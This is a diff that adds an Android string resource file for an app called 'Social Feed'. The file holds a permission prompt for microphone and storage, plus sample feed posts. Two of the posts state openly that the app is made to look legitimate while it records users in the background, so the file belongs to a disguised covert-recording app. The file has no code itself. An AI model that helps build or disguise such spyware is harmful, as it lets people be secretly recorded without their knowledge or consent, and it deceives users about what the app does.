@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Social Feed</string>
+    <string name="permission_request_title">Permissions Required</string>
+    <string name="permission_request_message">This app needs microphone and storage permissions to function properly.</string>
+    <string name="permission_denied_message">Permissions required to use this app</string>
+    <string name="ok">OK</string>
+    <string name="cancel">Cancel</string>
+    <string name="post_title_1">User One</string>
+    <string name="post_content_1">This is a sample post for our social media interface. The app is designed to look legitimate while running background recording services.</string>
+    <string name="post_title_2">User Two</string>
+    <string name="post_content_2">Another sample post for our research application. Users will scroll through this content while the app records in the background.</string>
+    <string name="post_title_3">User Three</string>
+    <string name="post_content_3">Check out these awesome photos from my vacation! I\'ll be posting more content throughout the week.</string>
+    <string name="post_title_4">User Four</string>
+    <string name="post_content_4">Just discovered this amazing app! The interface is so clean and easy to use.</string>
+    <string name="post_title_5">User Five</string>
+    <string name="post_content_5">Anyone else having trouble with the latest system update? My phone keeps crashing randomly.</string>
+</resources>
